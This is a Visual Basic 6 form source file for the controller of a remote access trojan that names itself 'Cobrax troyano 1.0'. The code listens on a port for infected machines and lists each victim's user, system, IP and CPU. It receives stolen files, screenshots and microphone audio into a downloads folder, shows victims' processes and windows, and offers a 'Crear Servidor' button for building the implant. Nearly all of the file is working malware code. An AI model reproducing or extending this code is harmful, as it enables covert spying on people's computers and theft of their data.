VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   ClientHeight    =   4335
   ClientLeft      =   5880
   ClientTop       =   3345
   ClientWidth     =   13755
   Icon            =   "Cliente.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "Cliente.frx":74F2
   ScaleHeight     =   4335
   ScaleWidth      =   13755
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Opciones 
      Caption         =   "&Opciones"
      Height          =   4215
      Left            =   12240
      TabIndex        =   1
      Top             =   0
      Width           =   1455
      Begin VB.CommandButton Command5 
         Caption         =   "&Salir"
         Height          =   375
         Left            =   120
         TabIndex        =   6
         Top             =   3720
         Width           =   1215
      End
      Begin VB.CommandButton Command6 
         Caption         =   "&Saber mas!"
         Height          =   375
         Left            =   120
         TabIndex        =   5
         Top             =   1680
         Width           =   1215
      End
      Begin VB.CommandButton Command3 
         Caption         =   "&Puertos"
         Height          =   375
         Left            =   120
         TabIndex        =   4
         Top             =   1200
         Width           =   1215
      End
      Begin VB.CommandButton Command4 
         Caption         =   "&Ocultar"
         Height          =   375
         Left            =   120
         TabIndex        =   3
         Top             =   720
         Width           =   1215
      End
      Begin VB.CommandButton Command2 
         Caption         =   "&Crear Servidor"
         Height          =   375
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   1215
      End
   End
   Begin MSComctlLib.ListView LV 
      Height          =   4095
      Left            =   0
      TabIndex        =   0
      Top             =   120
      Width           =   12135
      _ExtentX        =   21405
      _ExtentY        =   7223
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ForeColor       =   -2147483635
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   4
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "a"
         Object.Tag             =   "a"
         Text            =   "Usuarios"
         Object.Width           =   3177
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Key             =   "b"
         Object.Tag             =   "b"
         Text            =   "Sistema"
         Object.Width           =   4940
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Key             =   "c"
         Object.Tag             =   "c"
         Text            =   "IP"
         Object.Width           =   3881
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Key             =   "d"
         Object.Tag             =   "d"
         Text            =   "CPU"
         Object.Width           =   5469
      EndProperty
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   0
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   100
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   480
      OleObjectBlob   =   "Cliente.frx":8C61B
      Top             =   0
   End
   Begin VB.Timer titulo 
      Interval        =   10
      Left            =   0
      Top             =   0
   End
   Begin VB.Menu Prgm 
      Caption         =   "Programa"
      Begin VB.Menu C 
         Caption         =   "Crear servidor"
      End
      Begin VB.Menu Bb 
         Caption         =   "Ocultar"
      End
      Begin VB.Menu A 
         Caption         =   "Salir"
      End
   End
   Begin VB.Menu Bx 
      Caption         =   "Configuracion"
   End
   Begin VB.Menu B 
      Caption         =   "Saber mas"
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpFileName As String, ByVal newfilename As String, ByVal lpExistingFileName As Boolean) As Boolean
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Boolean
Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpCommand As String, ByVal path As String, ByVal lpreturns As String, ByVal show As Long) As Long
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
'Private Declare Function mciSendString Lib "winmm" Alias "mciSendStringA" (ByVal lpcommand As String, ByVal ntlogger As Long, ByVal returnation As String, ByVal ntonr As Long) As Long
Private Declare Function ShellAbout Lib "shell32" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal lpapp As String, ByVal two As String, ByVal lots As Long) As Long
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal nKey As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Declare Function GetSystemMetrics Lib "user32" (ByVal lParameter As Integer) As Long

Option Explicit

Dim i As Integer
Dim usercon As Boolean
Dim status As Boolean

Public recibe As String
Dim vIndex As Variant
Public TotalIndex As Integer
Public IndexAbir As Integer
Dim Index_n As Integer
Dim ff As Integer

'Dim img_status As Boolean
Dim lBytes As Long
Dim ifreefile As Integer
Dim contador As Boolean
Dim lFileSize As Long
Dim Flag As Boolean
Dim Wav As Boolean
Public IPRemte As String
Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer

Private Const SM_CXSCREEN = 0
Private Const SM_CYSCREEN = 1

Dim aniCursor1 As clsAniCursor

Private Sub B_Click()
Call ShellAbout(Form1.hwnd, "Cobrax troyano 1.0", "Troyano Cobrax ! By Nicolas Buzzi - contacto : xxneecoxx@gmail.com | claudio_nicolas_buzzi@hotmail.com", 0)
help.show
End Sub

Private Sub Bb_Click()
MsgBox "Presionando F8 podras restaurar esta ventana, mientras tanto recibiras notificaciones sobre los sucesos", vbInformation + vbOKOnly, "Aviso"
Me.Visible = False
lista.Visible = False
End Sub

Private Sub Bx_Click()
Configuracion.show
End Sub

Private Sub C_Click()
Form3.show
End Sub

Private Sub A_Click()
End
End Sub

Private Sub Command2_Click()
Form3.show
aniCursor1.CursorOn Form3.hwnd
End Sub

Private Sub Command3_Click()
Configuracion.show
End Sub

Private Sub Command4_Click()
MsgBox "Presionando F8 podras restaurar esta ventana, mientras tanto recibiras notificaciones sobre los sucesos", vbInformation + vbOKOnly, "Aviso"
Me.Visible = False
lista.Visible = False
End Sub

Private Sub Command5_Click()
End
End Sub

Private Sub Command6_Click()
help.show
End Sub


Private Sub Form_Activate()
aniCursor1.CursorOn Form1.hwnd
aniCursor1.CursorOn Command2.hwnd
aniCursor1.CursorOn Command3.hwnd
aniCursor1.CursorOn LV.hwnd
aniCursor1.CursorOn Command5.hwnd
aniCursor1.CursorOn Command6.hwnd
aniCursor1.CursorOn Command4.hwnd
End Sub

Private Sub Form_Load()

    If PathFileExists(App.path & "\DESCARGAS") = False Then
        MkDir App.path & "\DESCARGAS"
    End If
            
    Flag = False
    contador = False
    
    Set aniCursor1 = New clsAniCursor

    'testeo de extension
    'aniCursor1.AniFile = App.path & "\sk\1.ani"

    status = False
    lista.show
    
    lista.List1.ListItems.Add , , "Estado de conexiones disponibles actuales. [NO HAY USUARIOS CONECTADOS]"
    Call Comenzar(Me, 50, "[Troyano Cobrax] - Liberación 1 Nuevo Beta")
    
    If PathFileExists(App.path & "\sk\skin.skn") Then
        Skin1.LoadSkin App.path & "\sk\skin.skn"
        Skin1.ApplySkin Form1.hwnd
    End If
    
    If PathFileExists(App.path & "\Config.ini") Then
    
        Open App.path & "\Config.ini" For Input As #1
        Dim leido As String
        Dim leido_dos As String
        Dim leido_tres As String
        
        Line Input #1, leido
        Line Input #1, leido_dos
        Line Input #1, leido_tres
        Close #1
    End If
        
    Winsock1(0).LocalPort = Val(leido_dos)
    Winsock1(0).Listen
    TotalIndex = 0
    
    usercon = False
    
    lista.List1.ListItems.Add , , "[Cargando configuración de usuario " & Split(leido_tres, "=")(1) & "]"
    lista.List1.ListItems.Add , , "Escuchando el puerto " & leido_dos
    
    Dim ScaleFactorX As Single, ScaleFactorY As Single

    DesignX = GetSystemMetrics(SM_CXSCREEN)
    DesignY = GetSystemMetrics(SM_CYSCREEN)
    RePosForm = True
    DoResize = False

    Xtwips = Screen.TwipsPerPixelX
    Ytwips = Screen.TwipsPerPixelY
    Ypixels = Screen.Height / Ytwips
    Xpixels = Screen.Width / Xtwips

    ScaleFactorX = (Xpixels / DesignX)
    ScaleFactorY = (Ypixels / DesignY)
    ScaleMode = 1

    Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
    MyForm.Height = Me.Height
    MyForm.Width = Me.Width
End Sub

Private Sub Form_Resize()
    Dim ScaleFactorX As Single, ScaleFactorY As Single

      If Not DoResize Then
         DoResize = True
         Exit Sub
      End If

      RePosForm = False
      ScaleFactorX = Me.Width / MyForm.Width
      ScaleFactorY = Me.Height / MyForm.Height
      Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
      MyForm.Height = Me.Height
      MyForm.Width = Me.Width
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Call Detener(Me)
    If status = True Then
       'Winsock1(vIndex).SendData "clo" 'Nos desconectamos del servidor.
    End If
    End
End Sub

Private Sub LV_DblClick()
If Not LV.SelectedItem.Text = "" Then
    Unload Form2
    Form2.show
    Form2.Caption = "Panel de Control de " & LV.SelectedItem.SubItems(2)
    aniCursor1.CursorOn Form2.hwnd
    Form2.SetFocus
End If
End Sub

Private Sub titulo_Timer()

For i = 1 To LV.ListItems.Count
vIndex = Split(LV.ListItems(i).Key, "|")

If Winsock1(vIndex(0)).state <> 7 Then 'Si no estamos conectado
    LV.ListItems.Remove (LV.ListItems(i).Index)
    
    Unload Form2
    Unload Foto
    Unload Form4
    
    Exit For
End If

Next i

If GetAsyncKeyState(119) = -32767 Then
    Me.Visible = True
    lista.Visible = True
End If

If usercon = True Then
    MsgBox "Se ha conectado un nuevo usuario", vbInformation + vbOKOnly, "Conectado"
    Me.Visible = True
    lista.Visible = True
    usercon = False
End If
End Sub


Private Sub Winsock1_ConnectionRequest(Index As Integer, ByVal requestID As Long)

On Error Resume Next

Dim username As String
If PathFileExists(App.path & "\Config.ini") Then
    
    Open App.path & "\Config.ini" For Input As #1
    Dim leidox As String
    Dim leidox_dos As String
    Dim leidox_tres As String
        
    Line Input #1, leidox
    Line Input #1, leidox_dos
    Line Input #1, leidox_tres
    Close #1
End If

If Index = 0 Then
TotalIndex = 0 'Definimos la varible TotalIndex.
Else
TotalIndex = TotalIndex + 1 'Definimos la varible TotalIndex.
End If

Winsock1(Index).Close
Winsock1(Index).Accept requestID 'Y aceptamos la conexion
IPRemte = Winsock1(Index).RemoteHostIP
Load Winsock1(Index + 1) 'Cargamos un nuevo index
Winsock1(Index + 1).LocalPort = Val(leidox_dos)
IndexAbir = Index + 1 'Definimos la varible IndexAbir.
Winsock1(IndexAbir).Listen 'Escuhamos el puerto asignado.
Form5.show
'LV.ListItems.Add(, Index & "|", "Usuario " & Index).SubItems(1) = Winsock1(Index).RemoteHostIP
End Sub
Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    
    Dim arrData()   As Byte
    Dim vData       As Variant
    Dim arrDatax As String

    Dim name As String
    Dim name_dos As String
    Dim subelemento As ListItem
    Dim items As ListItem
    Dim listproc As ListItem
    Dim ventanaitem As ListItem
  
    If Flag = False Then
        Winsock1(Index).GetData vData, vbString
        arrDatax = vData
        If Mid(vData, 1, 9) = "|archivo|" Then
            Flag = True
            lBytes = 0
            vData = Split(vData, "|")
            lFileSize = vData(2)
            
            ' Le enviamos como mensaje al cliente que comienze el envio del archivo
              
            'Creamos un archivo en modo binario
 
        'name = App.path & "\imagenes\img" & Day(Now) & Month(Now) & Hour(Now) & Minute(Now) & ".jpg"
        
        Open App.path & "\DESCARGAS\" & vData(3) For Binary Access Write As #1
            
        ElseIf Mid(vData, 1, 9) = "|informa|" Then
        
                Set subelemento = LV.ListItems.Add(, Index & "|", "Usuario " & Index)
            
                vData = Split(vData, "|")
            
                subelemento.SubItems(1) = vData(2)
                
                subelemento.SubItems(2) = Winsock1(Index).RemoteHostIP
                subelemento.SubItems(3) = vData(3)
            
                usercon = True
                status = True
                
                mciSendString "play sk\on.mp3", 0, 0, 0
                
        ElseIf Mid(vData, 1, 9) = "|listado|" Then
        
            vData = Split(vData, "|")
            
            Set items = fmanager.arch.ListItems.Add(, , vData(2))
            
            items.SubItems(1) = vData(3)
            items.SubItems(2) = vData(4)
            items.SubItems(3) = vData(5) & " Bytes"
            
        ElseIf Mid(vData, 1, 9) = "|proceso|" Then
            
            vData = Split(vData, "|")
            
            Set listproc = procesos.ListView1.ListItems.Add(, , vData(2))
            
            listproc.SubItems(1) = vData(3)
            listproc.SubItems(2) = vData(4)

        ElseIf Mid(vData, 1, 9) = "|ventana|" Then
        
            vData = Split(vData, "|")
            
            Set ventanaitem = ventanas.ListView1.ListItems.Add(, , vData(2))
            ventanaitem.SubItems(1) = vData(3)
            ventanaitem.SubItems(2) = vData(4)
        
        End If
        
    End If
    
    If Flag Then
        ' Aumentamos lBytes con los datos que van llegando
        lBytes = lBytes + bytesTotal
        ' Foto.ProgressBar1.Value = lBytes
        Foto.Label1 = "Datos recibidos actualmente : %" & lBytes & " kb's"
        Foto.size.Caption = lFileSize
        Foto.bytes.Caption = lBytes
        'Recibimos los datos y lo almacenamos en el arry de bytes
        Winsock1(Index).GetData arrData
  
        'Escribimos en disco el array de bytes, es decir lo que va llegando
        Put #1, , arrData
  
        ' Si lo recibido es mayor o igual al tamaño entonces se terminó y cerramos
        'el archivo abierto
        If lBytes >= lFileSize Then
            'Cerramos el archivo
            Close #1
            'Reestablecemos el flag y la variable lBytes por si se intenta enviar otro archivo
            Flag = False
            lBytes = 0
            
            'Mostrar mensaje de finalización
            'DeleteFile App.path & "\image.bmp"
            
            
            If PathFileExists(App.path & "\sonido.wav") Then
                If FileLen(App.path & "\sonido.wav") >= lFileSize Then
                    Sleep 1000
                    lista.List1.ListItems.Add , , "[ Reproduciendo audio ]"
                    mciSendString "play sonido.wav wait", 0, 0, 0
                    CopyFile App.path & "\sonido.wav", App.path & "\DESCARGAS\sonido " & Month(Now) & "-" & Day(Now) & "-" & Year(Now) & "- " & Hour(Now) & "-" & Minute(Now) & "-" & Second(Now) & ".wav", False
                    DeleteFile App.path & "\sonido.wav"
                Else
                    lista.List1.ListItems.Add , , "[ Audio dañado o perdido, por favor intentelo nuevamente ]"
                    DeleteFile App.path & "\sonido.wav"
                End If
            End If
            
            On Error Resume Next
            If PathFileExists(App.path & "\DESCARGAS\img.jpg") Then
                If FileLen(App.path & "\DESCARGAS\img.jpg") >= lFileSize Then
                    Foto.Picture1.Picture = LoadPicture(App.path & "\DESCARGAS\img.jpg")
                Else
                    lista.List1.ListItems.Add , , "[ Imagen dañada o perdida, por favor intentelo nuevamente " & FileLen(App.path & "\img.jpg") & "/" & lFileSize & "bytes ]"
                End If
                DeleteFile App.path & "\img.jpg"
            End If

        End If
    Else
    
        If Not Mid(arrDatax, 1, 9) = "|informa|" And Not Mid(arrDatax, 1, 9) = "|listado|" And _
            Not Mid(arrDatax, 1, 9) = "|proceso|" And Not Mid(arrDatax, 1, 7) = "[System" And _
            Not Mid(arrDatax, 1, 9) = "|verific|" And Not Mid(arrDatax, 1, 9) = "|ventana|" Then
            
                lista.List1.ListItems.Add , , "[ Server ]" & Day(Now) & "/" & Month(Now) & "/" & Year(Now) & " - [" & Hour(Now) & ":" & Minute(Now) & ":" & Second(Now) & "] -> " & arrDatax & " "
        End If
    End If

End Sub

Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
lista.List1.ListItems.Add , , "[SE HA DESCONECTADO UN USUARIO] { " & Description & " " & Index & " }"
Unload Foto
Unload Form2
Unload Form4
Unload fmanager_d
Unload fondo
Unload services
Unload fmensaje
Unload ventanas
Unload fmanager
Unload procesos
Unload AUDIO
Unload fteclas
End Sub

Private Sub Winsock1_SendProgress(Index As Integer, ByVal bytesSent As Long, ByVal bytesRemaining As Long)
fmanager.XP_ProgressBar1.Value = bytesRemaining
End Sub
